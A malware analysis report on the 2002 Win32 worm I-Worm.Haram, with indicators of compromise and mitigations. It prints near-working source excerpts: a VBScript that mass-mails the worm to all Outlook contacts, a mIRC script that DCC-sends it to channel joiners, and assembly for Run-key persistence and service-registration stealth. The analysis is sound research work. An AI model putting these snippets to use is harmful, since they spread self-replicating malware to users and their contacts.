# 🛡️ Malware Analysis Report: I-Worm.Haram (win32asm)

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--06-blue)
![Malware Type](https://img.shields.io/badge/type-Win32%20Worm-red)
![Creation Window](https://img.shields.io/badge/date-2002--05--13_→_2002--06--01-orange)

## Overview

I-Worm.Haram is a Windows 32-bit worm written in assembly (MASM/TASM-style) by PetiK. The sample’s internal comments date it between May 13 and June 1, 2002, with a compressed size of ~5 KB (Petite packer). It combines several propagation vectors:
- Copies itself to the System directory as `FunnyGame.exe` and registers for autorun.
- Generates a VBS mass-mailer in the Startup folder to send itself via Outlook.
- Creates viral HTML files from user `.doc` documents and from running process names.
- Attempts IRC spread via mIRC `script.ini`.
- On the 10th day of the month, opens/closes the CD tray and loops a message box (payload).

Artifacts present in this folder:
- `haram.asm` — main source (assembly)
- `win32api.inc`, `useful.inc` — includes
- `haram.vbs`, `haram.htm` — standalone VBS/HTML payloads matching embedded resources
- `Compileharam.bat` — build helper
- `haram.ex_` — packed executable sample

> Disclaimer: Historical malware analysis for research/education. Do not execute outside a legal, isolated lab environment.

## Execution and Installation

On execution, the worm determines its own path and creates a copy in the System directory named `FunnyGame.exe`. It also sets a Run key under HKLM.

```asm
; copy to %System%\FunnyGame.exe
mov edi, offset cpywrm
push edi
push 50
push edi
call GetSystemDirectoryA
add  edi, eax
mov  eax, 'nuF\'     ; "Fun\"
stosd
mov  eax, 'aGyn'     ; "Gyna"
stosd
mov  eax, 'e.em'     ; "e.me"
stosd
mov  eax, 'ex'       ; "xe"
stosd
; CopyFileA(orig, cpywrm, TRUE)
push 1
push edi
push esi
call CopyFileA

; HKLM\...\Run\Haram = <path>
push 50
push edi
push 1
@pushsz "Haram"
@pushsz "Software\Microsoft\Windows\CurrentVersion\Run"
push 80000002h             ; HKEY_LOCAL_MACHINE
call SHSetValueA
```

Notes:
- The path string is built via reversed dword stores for speed; the result is `...\FunnyGame.exe`.
- If copying fails, a generic MessageBox is shown to the user (“ERROR: this file is not a valid Win32 file.”) as decoy.

## Startup VBS Mass-Mailer

The worm constructs a 10-digit random filename ending with `.vbs` in the user’s Startup folder and writes a VBS script that mass-mails `FunnyGame.exe` to all Outlook contacts.

```asm
; resolve Startup path and chdir
push 0
push 7
push offset startup
push 0
call SHGetSpecialFolderPathA
push offset startup
call SetCurrentDirectoryA

call cr_vbsname          ; builds random 10-digit name + ".vbs"
; CreateFileA(vbsname), WriteFile(s_vbs..e_vbs)
```

VBS payload (embedded as `s_vbs`) excerpt:

```vb
Set sys = terqne.GetSpecialFolder(1)
copyname = sys & "\FunnyGame.exe"
For each c In ofcc.AddressLists
  For d = 1 To c.AddressEntries.Count
    Set m = htgx.CreateItem(0)
    m.To = c.AddressEntries(d).Address
    m.Subject = "New game from the net for you " & c.AddressEntries(d).Name
    m.Body = "Play at this funny game. It's very cool !"
    m.Attachments.Add(copyname)
    If m.To <> "" Then m.Send
  Next
Next
```

## DOC → HTML Infection in Personal Folder

The routine `inf_doc_personal` scans the user’s Personal folder for `.doc` files and creates a same-name `.htm` virus page that prepends a marker `<haram>` and an HTML/VBS infector.

```asm
; Personal folder → SetCurrentDirectoryA
@pushsz "*.doc"
call FindFirstFileA
; for each match: new_file = <name with .htm>
sub esi, 4
mov [esi], "mth."   ; overwrite extension to HTM
CreateFileA(new_file)
WriteFile(s_htm .. e_htm)
```

The embedded HTML (`s_htm`) includes a VBScript that infects other HTML files by prepending `<haram>` and appending its own HTML body to them, across common folders (Windows, System, MyDocuments, Desktop, Favorites, Fonts), mirroring techniques seen in HTML-based worms of that era.

## Process-Name → HTML Droppers (C:\backup)

`inf_process` enumerates running processes and, for each, creates an HTML file in `C:\backup` named `<process.exe>.htm` containing the same HTML infector used above.

```asm
@pushsz "C:\backup"
call CreateDirectoryA
call SetCurrentDirectoryA
call CreateToolhelp32Snapshot
Process32First/Next ...
; new_name = szExeFile + ".htm"
mov eax, "mth."
stosd
CreateFileA(new_name)
WriteFile(s_htm .. e_htm)
```

This acts as a staging drop; the worm does not execute those `.htm` files itself but relies on user interaction or indexing to spread further.

## IRC (mIRC) Spread Attempt

A routine named `Spread_Mirc` writes a `script.ini` in common mIRC locations that DCC-sends the worm to users who join a channel.

```asm
s_mirc:
  db "[script]" CRLF
  db ";Don't edit this file." CRLF
  db "n0=on 1:JOIN:{" CRLF
  db "n1= /if ( $nick == $me ) { halt }" CRLF
  db "n2= /.dcc send $nick "
  ; then writes the path stored in mirc_exe (set to cpywrm = FunnyGame.exe)
  db CRLF "n3=}",0
```

mIRC paths tried: `C:\mirc\script.ini`, `C:\mirc32\script.ini`, and their Program Files short-path equivalents.

## Payload (Day 10): CD Tray and Message Loop

On the 10th of the month, a looped payload opens/closes the CD tray via MCI and displays an informational MessageBox, sleeping for a pseudo-random interval between iterations.

```asm
call GetSystemTime
cmp word ptr [sysTime+6], 10
jne end_payload
@pushsz "set CDAudio door open"
call mciSendStringA
Sleep 500
@pushsz "set CDAudio door closed"
call mciSendStringA
@pushsz "I-Worm.Haram"
@pushsz "Coded by PetiK - ©2002 - France"
call MessageBoxA
; randomized Sleep then repeat
```

## Stealth and Robustness

- Registers as a service process (Windows 9x/Me) if `RegisterServiceProcess` is available:

```asm
@pushsz "KERNEL32.DLL"
call GetModuleHandleA
@pushsz "RegisterServiceProcess"
call GetProcAddress
push 1
push 0
call ecx
```

- Structured exception handling macro `@SEH_SetupFrame` protects main flow and `@SEH_RemoveFrame` on exit.

## Files Written and Persistence Summary

- `%System%\FunnyGame.exe` — main copy; autostart under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Haram`.
- `%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\<10 digits>.vbs` — Outlook mass mailer.
- `%UserProfile%\My Documents\<docname>.htm` — HTML infector for each `.doc`.
- `C:\backup\<process.exe>.htm` — HTML infector per running process.
- mIRC `script.ini` in common mIRC folders — DCC dropper.

## Indicators of Compromise (IoCs)

- File: `FunnyGame.exe` in the System directory.
- Run key: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Haram` → `...\FunnyGame.exe`.
- Startup VBS file with 10-digit numeric name.
- Numerous `.htm` files prefixed with `<haram>` marker.
- `C:\backup` directory populated with `.htm` files named after running processes.
- mIRC `script.ini` modified/created in `C:\mirc*` paths.

## Mitigation

- Block COM automation of Outlook; monitor Startup folder for suspicious `.vbs` files.
- Scan and clean `%System%\FunnyGame.exe` and HKLM Run entries.
- Remove malicious mIRC `script.ini` and sanitize infected `.htm` files.
- Use endpoint protection capable of detecting script-infector hybrids and packed binaries.

## Notes

Haram blends several early-2000s vectors: Outlook-based mass-mailing, HTML/VBS prepending infection, mIRC DCC spreading, and simple time-based payloads. Its compact, hand-written assembly implementation showcases low-level Windows API usage and basic stealth via service registration.
